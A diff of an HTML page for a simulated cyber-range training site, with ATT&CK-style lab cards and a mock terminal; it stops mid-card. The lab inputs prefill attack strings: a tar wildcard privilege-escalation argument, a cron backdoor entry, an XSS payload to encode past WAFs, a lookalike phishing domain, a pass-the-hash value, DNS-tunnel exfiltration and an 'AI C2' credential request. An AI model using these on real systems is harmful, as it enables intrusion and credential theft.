@@ -4,232 +4,1010 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER RANGE - Training Ground</title>
+    <title>KALI CYBER RANGE // Enterprise Lab</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         :root {
-            --bg-color: #050505;
-            --panel-bg: #0d0d0d;
-            --cyber-blue: #00d2ff;
+            --kali-bg: #0b0f19;
+            --kali-panel: rgba(17, 24, 39, 0.85);
+            --kali-blue: #0d6efd;
+            --kali-neon: #00f0ff;
             --neon-green: #00ff41;
             --alert-red: #ff003c;
-            --text-color: #e0e0e0;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --border-glow: 0 0 15px rgba(13, 110, 253, 0.3);
         }
 
         body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Courier New', Courier, monospace;
+            background-color: var(--kali-bg);
+            color: var(--text-main);
+            font-family: 'Outfit', sans-serif;
             overflow-x: hidden;
-            background-image: radial-gradient(circle at 50% 50%, #111 0%, #000 100%);
+            background-image: radial-gradient(circle at 50% 50%, #151e33 0%, #080b12 100%);
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
-        .navbar {
-            background: rgba(0,0,0,0.9);
-            border-bottom: 1px solid var(--cyber-blue);
-            padding: 15px 30px;
+        .share-tech {
+            font-family: 'Share Tech Mono', monospace;
         }
 
-        .navbar-brand {
-            color: var(--cyber-blue) !important;
-            font-weight: bold;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px rgba(0, 210, 255, 0.5);
+        /* Top Header */
+        .kali-navbar {
+            background: rgba(8, 12, 21, 0.95);
+            border-bottom: 2px solid var(--kali-blue);
+            box-shadow: 0 0 15px rgba(13, 110, 253, 0.2);
+            padding: 10px 20px;
+            z-index: 1000;
         }
 
-        .container-main {
-            padding: 40px;
+        .kali-logo img {
+            width: 28px;
+            height: auto;
+            margin-right: 10px;
+            animation: pulse 2s infinite alternate;
         }
 
-        .lab-card {
-            background: var(--panel-bg);
-            border: 1px solid rgba(0, 255, 65, 0.2);
-            border-radius: 5px;
-            padding: 20px;
-            margin-bottom: 25px;
-            transition: all 0.3s ease;
-            position: relative;
+        @keyframes pulse {
+            0% { filter: drop-shadow(0 0 2px var(--kali-neon)); }
+            100% { filter: drop-shadow(0 0 8px var(--kali-neon)); }
+        }
+
+        /* Main Workspace Container */
+        .workspace-wrapper {
+            flex: 1;
+            display: flex;
             overflow: hidden;
         }
 
-        .lab-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 4px; height: 100%;
-            background: var(--neon-green);
+        /* Sidebar: Kali categories */
+        .kali-sidebar {
+            width: 320px;
+            background: rgba(10, 15, 26, 0.95);
+            border-right: 1px solid rgba(13, 110, 253, 0.2);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            padding: 15px 0;
         }
 
-        .lab-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.1);
-            border-color: var(--neon-green);
+        .kali-sidebar::-webkit-scrollbar {
+            width: 4px;
+        }
+        .kali-sidebar::-webkit-scrollbar-thumb {
+            background: var(--kali-blue);
         }
 
-        .lab-card.hard::before { background: var(--alert-red); }
-        .lab-card.medium::before { background: #ffaa00; }
-
-        .lab-title {
-            font-size: 20px;
-            font-weight: bold;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-
-        .lab-desc {
-            font-size: 14px;
-            color: #aaa;
-            margin-bottom: 20px;
-        }
-
-        .lang-badge {
-            display: inline-block;
-            padding: 3px 8px;
+        .category-title {
             font-size: 11px;
-            border-radius: 3px;
-            margin-right: 10px;
-            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--kali-neon);
+            padding: 10px 20px;
+            font-weight: 800;
         }
 
-        .badge-ruby { background: #701516; color: white; }
-        .badge-asm { background: #4b4b4b; color: white; }
-        .badge-go { background: #00add8; color: white; }
-        .badge-bash { background: #4EAA25; color: white; }
-
-        .btn-start {
-            background: transparent;
-            color: var(--neon-green);
-            border: 1px solid var(--neon-green);
-            padding: 8px 20px;
-            font-family: inherit;
-            cursor: pointer;
-            transition: 0.3s;
+        .category-item {
+            display: flex;
+            align-items: center;
+            padding: 11px 20px;
+            color: var(--text-main);
             text-decoration: none;
-            display: inline-block;
+            font-size: 13.5px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            border-left: 3px solid transparent;
+            cursor: pointer;
         }
 
-        .btn-start:hover {
-            background: var(--neon-green);
+        .category-item i {
+            margin-right: 12px;
+            width: 18px;
+            text-align: center;
+            color: var(--kali-blue);
+            transition: color 0.2s ease;
+        }
+
+        .category-item:hover {
+            background: rgba(13, 110, 253, 0.1);
+            color: var(--kali-neon);
+            border-left-color: var(--kali-neon);
+        }
+
+        .category-item.active {
+            background: rgba(13, 110, 253, 0.15);
+            color: var(--kali-neon);
+            border-left-color: var(--kali-neon);
+            box-shadow: inset 5px 0 10px rgba(0, 240, 255, 0.05);
+        }
+
+        .category-item.active i {
+            color: var(--kali-neon);
+            text-shadow: 0 0 10px var(--kali-neon);
+        }
+
+        /* Right Panel: Content View */
+        .kali-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: rgba(11, 15, 25, 0.98);
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .kali-panel-header {
+            background: rgba(15, 23, 42, 0.8);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .lab-viewport {
+            flex: 1;
+            padding: 30px;
+        }
+
+        /* Lab Cards */
+        .glass-card {
+            background: var(--kali-panel);
+            border: 1px solid rgba(13, 110, 253, 0.15);
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            backdrop-filter: blur(4px);
+            transition: all 0.3s ease;
+            margin-bottom: 25px;
+        }
+
+        .glass-card:hover {
+            border-color: var(--kali-neon);
+            box-shadow: 0 8px 32px 0 rgba(0, 240, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .btn-kali {
+            background: transparent;
+            color: var(--kali-neon);
+            border: 1px solid var(--kali-neon);
+            padding: 8px 20px;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .btn-kali:hover {
+            background: var(--kali-neon);
             color: #000;
+            box-shadow: 0 0 15px var(--kali-neon);
         }
 
-        .hacker-stats {
-            background: var(--panel-bg);
-            border: 1px solid #333;
-            padding: 20px;
-            margin-bottom: 30px;
+        /* Mock Linux Terminal */
+        .term-panel {
+            background: #050811;
+            border-top: 2px solid var(--kali-blue);
+            height: 250px;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Share Tech Mono', monospace;
         }
 
-        .progress {
-            background: #222;
-            height: 10px;
-            border-radius: 0;
-            margin-top: 10px;
+        .term-header {
+            background: #0d1326;
+            padding: 6px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            border-bottom: 1px solid rgba(13, 110, 253, 0.1);
         }
 
-        .progress-bar {
-            background: var(--neon-green);
-            box-shadow: 0 0 10px var(--neon-green);
+        .term-body {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            color: var(--neon-green);
+            font-size: 13px;
+            line-height: 1.5;
         }
+
+        .term-input-line {
+            display: flex;
+            align-items: center;
+        }
+
+        .term-prompt {
+            color: var(--kali-neon);
+            margin-right: 10px;
+        }
+
+        .term-input {
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            outline: none;
+            flex: 1;
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        /* Visual Labs Components */
+        .lab-input {
+            background: #070a14;
+            border: 1px solid rgba(13, 110, 253, 0.3);
+            color: var(--text-main);
+            padding: 10px;
+            border-radius: 4px;
+            width: 100%;
+            outline: none;
+            font-family: 'Share Tech Mono', monospace;
+            margin-bottom: 15px;
+        }
+
+        .lab-input:focus {
+            border-color: var(--kali-neon);
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .badge-success { background: rgba(0, 255, 65, 0.15); color: var(--neon-green); border: 1px solid var(--neon-green); }
+        .badge-danger { background: rgba(255, 0, 60, 0.15); color: var(--alert-red); border: 1px solid var(--alert-red); }
+        .badge-info { background: rgba(0, 240, 255, 0.15); color: var(--kali-neon); border: 1px solid var(--kali-neon); }
     </style>
 </head>
 <body>
 
-    <nav class="navbar d-flex justify-content-between align-items-center">
-        <a class="navbar-brand" href="#"><i class="fa-solid fa-crosshairs me-2"></i>CYBER_RANGE // TRAINING_GROUND</a>
-        <div>
-            <a href="/cyber-ops/" class="btn-start" style="border-color: var(--cyber-blue); color: var(--cyber-blue);">BACK TO WAR ROOM</a>
+    <!-- TOP HEADER NAVBAR -->
+    <nav class="kali-navbar d-flex justify-content-between align-items-center">
+        <div class="d-flex align-items-center">
+            <div class="kali-logo">
+                <img src="https://images.squarespace-cdn.com/content/v1/5527d057e4b09fae4860b8ab/1638210356501-A4U1X10Q42T0M900K6A0/kali-dragon-32.png" alt="Kali Logo">
+            </div>
+            <div>
+                <span class="share-tech fs-5 text-white" style="letter-spacing: 2px;">KALI LINUX // CYBER_RANGE</span>
+                <span class="badge bg-danger ms-2" style="font-size: 10px;">ENTERPRISE EDITION</span>
+            </div>
+        </div>
+        <div class="d-flex gap-3 align-items-center">
+            <div class="share-tech text-muted" style="font-size: 12px;">
+                <i class="fa-solid fa-user-secret text-info me-2"></i> PENTESTER: <span class="text-white">shohjahon2323</span>
+            </div>
+            <a href="/cyber-ops/" class="btn-kali btn-sm" style="border-color: var(--kali-blue); color: var(--kali-blue); font-size:11px;">
+                <i class="fa-solid fa-house me-1"></i> Exit To War Room
+            </a>
         </div>
     </nav>
 
-    <div class="container-main row">
-        <div class="col-md-3">
-            <div class="hacker-stats">
-                <div class="text-center mb-4">
-                    <img src="https://i.pinimg.com/736x/8f/c3/7b/8fc37b7cbea9883db46522cbb54d2466.jpg" alt="Avatar" style="width:100px; height:100px; border-radius:50%; border: 2px solid var(--neon-green);">
-                    <h5 class="mt-3 text-white">Guest Pentester</h5>
-                    <div style="color: var(--neon-green); font-size: 12px;">Rank: Script Kiddie</div>
-                </div>
+    <!-- MAIN WORKSPACE -->
+    <div class="workspace-wrapper">
+        
+        <!-- SIDEBAR: KALI MENU TOIFALARI (01-16) -->
+        <div class="kali-sidebar">
+            <div class="category-title">Kali Menu Categories</div>
+            
+            <a class="category-item active" onclick="loadCategory('recon')">
+                <i class="fa-solid fa-magnifying-glass"></i> 01 - Reconnaissance
+            </a>
+            <a class="category-item" onclick="loadCategory('resource')">
+                <i class="fa-solid fa-hammer"></i> 02 - Resource Development
+            </a>
+            <a class="category-item" onclick="loadCategory('initial')">
+                <i class="fa-solid fa-door-open"></i> 03 - Initial Access
+            </a>
+            <a class="category-item" onclick="loadCategory('execution')">
+                <i class="fa-solid fa-terminal"></i> 04 - Execution
+            </a>
+            <a class="category-item" onclick="loadCategory('persistence')">
+                <i class="fa-solid fa-anchor"></i> 05 - Persistence
+            </a>
+            <a class="category-item" onclick="loadCategory('privesc')">
+                <i class="fa-solid fa-chevron-up"></i> 06 - Privilege Escalation
+            </a>
+            <a class="category-item" onclick="loadCategory('evasion')">
+                <i class="fa-solid fa-mask"></i> 07 - Defense Evasion
+            </a>
+            <a class="category-item" onclick="loadCategory('credentials')">
+                <i class="fa-solid fa-key"></i> 08 - Credential Access
+            </a>
+            <a class="category-item" onclick="loadCategory('discovery')">
+                <i class="fa-solid fa-compass"></i> 09 - Discovery
+            </a>
+            <a class="category-item" onclick="loadCategory('lateral')">
+                <i class="fa-solid fa-arrows-left-right"></i> 10 - Lateral Movement
+            </a>
+            <a class="category-item" onclick="loadCategory('collection')">
+                <i class="fa-solid fa-briefcase"></i> 11 - Collection
+            </a>
+            <a class="category-item" onclick="loadCategory('c2')">
+                <i class="fa-solid fa-satellite-dish"></i> 12 - Command and Control
+            </a>
+            <a class="category-item" onclick="loadCategory('exfiltration')">
+                <i class="fa-solid fa-upload"></i> 13 - Exfiltration
+            </a>
+            <a class="category-item" onclick="loadCategory('impact')">
+                <i class="fa-solid fa-radiation"></i> 14 - Impact
+            </a>
+            <a class="category-item" onclick="loadCategory('forensics')">
+                <i class="fa-solid fa-magnifying-glass-chart"></i> 15 - Forensics
+            </a>
+            <a class="category-item" onclick="loadCategory('services')">
+                <i class="fa-solid fa-sliders"></i> 16 - Services and Other Tools
+            </a>
+        </div>
+
+        <!-- RIGHT PANEL: VIEWPORT -->
+        <div class="kali-content">
+            <div class="kali-panel-header">
                 <div>
-                    <div class="d-flex justify-content-between" style="font-size:12px;"><span>Level 1</span><span>200 / 1000 XP</span></div>
-                    <div class="progress">
-                        <div class="progress-bar" style="width: 20%"></div>
+                    <h4 id="category-header-title" class="mb-1 text-white share-tech">01 - RECONNAISSANCE MODULES</h4>
+                    <p id="category-header-desc" class="text-muted mb-0" style="font-size: 13px;">Analyze headers, extract metadata, and gather cyber intelligence.</p>
+                </div>
+                <div class="share-tech">
+                    <span class="text-info"><i class="fa-solid fa-graduation-cap me-1"></i> XP: 250/1000</span>
+                </div>
+            </div>
+
+            <!-- LAB VIEWPORT -->
+            <div class="lab-viewport" id="lab-viewport-container">
+                <!-- Loaded dynamically by Javascript -->
+            </div>
+
+            <!-- INTERACTIVE LINUX TERMINAL -->
+            <div class="term-panel">
+                <div class="term-header">
+                    <span><i class="fa-solid fa-square-terminal text-info me-2"></i> kali-terminal-emulator // shohjahon@kali</span>
+                    <div>
+                        <span class="text-muted me-3">STATUS: ONLINE</span>
+                        <i class="fa-solid fa-minus me-2"></i>
+                        <i class="fa-solid fa-expand me-2"></i>
+                        <i class="fa-solid fa-xmark text-danger"></i>
                     </div>
                 </div>
-                <hr style="border-color: #333;">
-                <div style="font-size: 13px; color: #aaa;">
-                    <div><i class="fa-solid fa-skull me-2 mb-2"></i> Owned Labs: 0</div>
-                    <div><i class="fa-solid fa-flag me-2 mb-2"></i> Flags Captured: 0</div>
-                    <div><i class="fa-solid fa-fire me-2"></i> Streak: 1 Day</div>
+                <div class="term-body" id="terminal-history">
+                    <div>[+] Welcome to Kali Linux CLI Simulator! Type 'help' to see available commands.</div>
+                    <div>[+] Tip: Try 'strings keylogger.exe' or 'yara rules.yar keylogger.exe' to solve labs.</div>
+                </div>
+                <div class="term-header" style="border-top:1px solid rgba(13,110,253,0.1); border-bottom:none;">
+                    <div class="term-input-line w-100">
+                        <span class="term-prompt">shohjahon@kali:~$</span>
+                        <input type="text" class="term-input" id="terminal-cli" autocomplete="off" autofocus>
+                    </div>
                 </div>
             </div>
         </div>
 
-        <div class="col-md-9">
-            <h3 style="color: var(--cyber-blue); border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 30px;">
-                <i class="fa-solid fa-laptop-code me-2"></i> ACTIVE MODULES
-            </h3>
-
-            <div class="row">
-                <!-- LAB 1 -->
-                <div class="col-md-6">
-                    <div class="lab-card medium">
-                        <div class="lab-title">Lab 1: Insecure Deserialization</div>
-                        <div class="lab-desc">Exploit a Ruby application that blindly unmarshals user-supplied YAML data. Craft a malicious payload to spawn a reverse shell or read sensitive files.</div>
-                        <div class="mb-3">
-                            <span class="lang-badge badge-ruby">Ruby</span>
-                            <span style="color:#aaa; font-size:12px;">Difficulty: Medium</span>
-                        </div>
-                        <button class="btn-start" onclick="alert('Starting VM instance for Lab 1... Please wait 30 seconds.')">START MACHINE</button>
-                    </div>
-                </div>
-
-                <!-- LAB 2 -->
-                <div class="col-md-6">
-                    <div class="lab-card hard">
-                        <div class="lab-title">Lab 2: Buffer Overflow (x86)</div>
-                        <div class="lab-desc">A classic buffer overflow vulnerability in a custom C/Assembly binary. Understand the stack, overwrite the EIP instruction pointer, and inject your shellcode.</div>
-                        <div class="mb-3">
-                            <span class="lang-badge badge-asm">Assembly (x86)</span>
-                            <span style="color:#aaa; font-size:12px;">Difficulty: Hard</span>
-                        </div>
-                        <button class="btn-start" onclick="alert('Starting VM instance for Lab 2... Please wait 30 seconds.')">START MACHINE</button>
-                    </div>
-                </div>
-
-                <!-- LAB 3 -->
-                <div class="col-md-6">
-                    <div class="lab-card">
-                        <div class="lab-title">Lab 3: Command Injection</div>
-                        <div class="lab-desc">A Go-based web application that pings an IP address. Bypass input validation to inject arbitrary shell commands and take control of the server.</div>
-                        <div class="mb-3">
-                            <span class="lang-badge badge-go">Go</span>
-                            <span style="color:#aaa; font-size:12px;">Difficulty: Easy</span>
-                        </div>
-                        <button class="btn-start" onclick="alert('Starting VM instance for Lab 3... Please wait 30 seconds.')">START MACHINE</button>
-                    </div>
-                </div>
-
-                <!-- LAB 4 -->
-                <div class="col-md-6">
-                    <div class="lab-card medium">
-                        <div class="lab-title">Lab 4: Linux Privilege Escalation</div>
-                        <div class="lab-desc">You have low-privileged access. Abuse a poorly configured root cronjob running a Bash script with wildcards to escalate to root privileges.</div>
-                        <div class="mb-3">
-                            <span class="lang-badge badge-bash">Bash</span>
-                            <span style="color:#aaa; font-size:12px;">Difficulty: Medium</span>
-                        </div>
-                        <button class="btn-start" onclick="alert('Starting VM instance for Lab 4... Please wait 30 seconds.')">START MACHINE</button>
-                    </div>
-                </div>
-            </div>
-
-            <div style="background: rgba(0,210,255,0.05); border: 1px dashed var(--cyber-blue); padding: 20px; text-align: center; margin-top: 20px;">
-                <h5 style="color: var(--cyber-blue);"><i class="fa-solid fa-lock me-2"></i> MORE LABS UNLOCK AT LEVEL 5</h5>
-                <p style="color: #888; font-size: 13px; margin: 0;">Complete current labs to gain XP and unlock advanced Active Directory and Web Exploitation modules.</p>
-            </div>
-        </div>
     </div>
+
+    <!-- MAIN INTERACTIVE LAB ENGINE -->
+    <script>
+        const categories = {
+            recon: {
+                title: "01 - RECONNAISSANCE MODULES",
+                desc: "Analyze headers, extract metadata, and gather cyber intelligence.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-envelope me-2 text-info"></i> Phishing Email Header Analyzer</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Analyze raw email headers to verify SPF, DKIM, and DMARC alignments to detect spoofed sender attacks.</p>
+                        <textarea class="lab-input" rows="4" id="email-header-input" placeholder="Paste raw email header here..."></textarea>
+                        <div class="d-flex gap-2">
+                            <button class="btn-kali" onclick="analyzeEmailHeader()">Parse & Analyze Header</button>
+                            <button class="btn-kali" style="border-color:#555; color:#aaa;" onclick="loadSampleHeader()">Load Sample Spoofed Header</button>
+                        </div>
+                        <div id="header-analysis-result" class="mt-3"></div>
+                    </div>
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-file-image me-2 text-info"></i> Metadata & EXIF Tool Extractor</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Extract embedded technical metadata (EXIF data) from user-supplied image and document files to build target profile vectors.</p>
+                        <input type="file" class="lab-input" id="exif-file-input" onchange="extractMetadata(this)">
+                        <div id="exif-analysis-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            resource: {
+                title: "02 - RESOURCE DEVELOPMENT MODULES",
+                desc: "Establish command and control domains, configure redirects, and build campaign infrastructure.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-globe me-2 text-info"></i> IDN Homograph Attack Sandbox</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Understand internationalized domain name spoofing using Cyrillic lookalike characters (Punycode conversion).</p>
+                        <input type="text" class="lab-input" id="idn-domain" value="paypаl.com" placeholder="Type domain...">
+                        <button class="btn-kali" onclick="convertPunycode()">Convert to Punycode</button>
+                        <div id="idn-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            initial: {
+                title: "03 - INITIAL ACCESS MODULES",
+                desc: "Simulate and analyze entry vectors, credential capture triggers, and session persistence.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-shield-halved me-2 text-info"></i> MFA Bypass Simulator (Session Hijacking)</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Understand how modern AitM (Adversary-in-the-Middle) phishing proxies bypass multi-factor security by exfiltrating live Session Cookies.</p>
+                        <div style="background:#050811; border:1px solid #112; padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px; color:#aaa; margin-bottom:15px;">
+                            [+] Target MFA status: <span class="text-warning">ACTIVE (TOTP / SMS enabled)</span><br>
+                            [+] Phishing link generated: <span class="text-info">http://verification.paypa1-security.com/login/</span>
+                        </div>
+                        <button class="btn-kali" onclick="simulateMfaBypass()">Initiate Proxy Intercept</button>
+                        <div id="mfa-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            execution: {
+                title: "04 - EXECUTION MODULES",
+                desc: "Study execution commands, vulnerable runtime deserialization, and OS command flows.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-skull-crossbones me-2 text-info"></i> Ruby Insecure Deserialization Lab</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Exploit unsafe deserialization vectors where the application blindly parses raw serialization structures.</p>
+                        <input type="text" class="lab-input" id="ruby-yaml-payload" value='--- !ruby/object:Gem::Requirement {"status": "compromised"}' placeholder="YAML Payload">
+                        <button class="btn-kali" onclick="exploitDeserialization()">Execute Payload</button>
+                        <div id="deserialization-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            persistence: {
+                title: "05 - PERSISTENCE MODULES",
+                desc: "Establish persistent handles, registry triggers, and task execution scheduling.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-clock me-2 text-info"></i> Linux Cronjob Autostart</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Add custom automated scripts to schedule lists for persistent backdoors.</p>
+                        <input type="text" class="lab-input" id="cron-input" value="*/5 * * * * /tmp/backdoor.sh" placeholder="Cron schedule...">
+                        <button class="btn-kali" onclick="addCronjob()">Register Persistent Cron</button>
+                        <div id="cron-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            privesc: {
+                title: "06 - PRIVILEGE ESCALATION MODULES",
+                desc: "Exploit local kernel exploits, poor pathing configuration, and wildcards in cron executions.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-circle-chevron-up me-2 text-info"></i> Linux Wildcard Cron escalation</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Abuse cron processes running tar with wildcards (*) to execute custom privilege elevation parameters.</p>
+                        <div style="background:#070a14; border:1px solid #112; padding:15px; border-radius:4px; font-family:monospace; font-size:13px; color:#aaa; margin-bottom:15px;">
+                            [+] Vulnerable cronjob script: <span class="text-warning">tar -cf backup.tar *</span><br>
+                            [+] Path to exploit: <span class="text-info">--checkpoint=1 --checkpoint-action=exec=shell.sh</span>
+                        </div>
+                        <button class="btn-kali" onclick="triggerPrivEsc()">Trigger Privilege Escalation</button>
+                        <div id="privesc-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            evasion: {
+                title: "07 - DEFENSE EVASION MODULES",
+                desc: "Analyze Web Application Firewall (WAF) bypasses, encoding flows, and script protection mechanisms.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-shield-halved me-2 text-info"></i> WAF Evasion & Encoding Tool</h5>
+                        <p class="text-muted" style="font-size:13.5px;">WAF rules block standard inputs. Encode payloads to bypass filtration filters.</p>
+                        <input type="text" class="lab-input" id="waf-payload" value="<script>alert(1)</script>" placeholder="Payload to obfuscate...">
+                        <div class="d-flex gap-2">
+                            <button class="btn-kali" onclick="encodePayload('url')">URL Encode</button>
+                            <button class="btn-kali" onclick="encodePayload('hex')">HEX Encode</button>
+                            <button class="btn-kali" onclick="encodePayload('base64')">Base64 Encode</button>
+                        </div>
+                        <div id="waf-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            credentials: {
+                title: "08 - CREDENTIAL ACCESS MODULES",
+                desc: "Intercept live keyboard inputs, capture biometric dynamics, and crack credential hashes.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-keyboard me-2 text-info"></i> Dynamic Keystroke Biometrics Visualizer</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Type in the input box below to see how typing metrics (flight time/dwell time) generate a biometric signature.</p>
+                        <input type="text" class="lab-input" id="biometrics-test-input" placeholder="Start typing here to render biometrics graph...">
+                        <div style="max-height: 200px; position: relative;">
+                            <canvas id="keystrokeChart" height="80"></canvas>
+                        </div>
+                    </div>
+                `
+            },
+            discovery: {
+                title: "09 - DISCOVERY MODULES",
+                desc: "Probe networks, discover endpoints, audit open ports, and gather environmental vectors.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-network-wired me-2 text-info"></i> Network Scanning Sandbox</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Perform port scanning to identify open web ports, SSH listening points, and firewall rules.</p>
+                        <input type="text" class="lab-input" id="scan-target" value="192.168.1.1" placeholder="Target IP...">
+                        <button class="btn-kali" onclick="runPortScan()">Run Nmap Port Scan</button>
+                        <div id="scan-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            lateral: {
+                title: "10 - LATERAL MOVEMENT MODULES",
+                desc: "Understand movement vectors, token delegation, and system session impersonation.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-key me-2 text-info"></i> Pass-the-Hash (PtH) impersonation</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Abuse captured NTLM hashes to establish sessions on remote systems without knowing plain passwords.</p>
+                        <input type="text" class="lab-input" id="pth-hash" value="32ee83b56a3f1244093cd0f9a2123456" placeholder="NTLM Hash...">
+                        <button class="btn-kali" onclick="triggerPtH()">Pass the Hash</button>
+                        <div id="pth-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            collection: {
+                title: "11 - COLLECTION MODULES",
+                desc: "Harvest storage values, session buffers, system clipboards, and local directories.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-clipboard me-2 text-info"></i> Clipboard Hijacker Extractor</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Simulate client-side collection targeting copied password streams and system variables.</p>
+                        <button class="btn-kali" onclick="readHackerClipboard()">Capture Copied clipboard</button>
+                        <div id="clip-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            c2: {
+                title: "12 - COMMAND AND CONTROL MODULES",
+                desc: "Dispatch active system parameters, control remote interfaces, and handle telemetry channels.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-satellite-dish me-2 text-info"></i> J.A.R.V.I.S / AI C2 Co-Pilot Console</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Engage the advanced AI Co-Pilot dispatcher module to automatically generate script handlers.</p>
+                        <input type="text" class="lab-input" id="c2-instructions" value="Show all intercepted administrator credentials" placeholder="Prompt AI Co-Pilot...">
+                        <button class="btn-kali" onclick="dispatchAICommand()">Dispatch Command</button>
+                        <div id="c2-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            exfiltration: {
+                title: "13 - EXFILTRATION MODULES",
+                desc: "Transmit compromised elements via covert paths (DNS tunnel streams, HTTP headers, ICMP packet payloads).",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-file-export me-2 text-info"></i> DNS Tunneling Encoder</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Encrypt data payloads and exfiltrate them hidden inside standard DNS queries targeting custom name servers.</p>
+                        <input type="text" class="lab-input" id="exfil-data" value="AdminPassword99" placeholder="Sensitive Data to Exfiltrate...">
+                        <button class="btn-kali" onclick="encodeDnsTunnel()">Encode covert DNS Query</button>
+                        <div id="exfil-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            impact: {
+                title: "14 - IMPACT MODULES",
+                desc: "Simulate service disruption, safe ransomware encryption pipelines, and emergency Protocol Zero wipers.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-radiation me-2 text-info"></i> Protocol Zero (Emergency Wipe System)</h5>
+                        <p class="text-muted" style="font-size:13.5px;">Initiate emergency kill switch actions to purge all log databases, caches, and exfiltrated payloads.</p>
+                        <button class="btn-kali" style="border-color:var(--alert-red); color:var(--alert-red);" onclick="activateKillSwitch()">Trigger Protocol Zero</button>
+                        <div id="impact-result" class="mt-3"></div>
+                    </div>
+                `
+            },
+            forensics: {
+                title: "15 - FORENSICS MODULES",
+                desc: "Analyze logs, create YARA detection signatures, recover decryption keys, and parse telemetry headers.",
+                labs: `
+                    <div class="glass-card">
+                        <h5 class="share-tech text-white"><i class="fa-solid fa-magnifying-glass-chart me-2 text-info"></i> YARA Rule Developer Lab</h5>
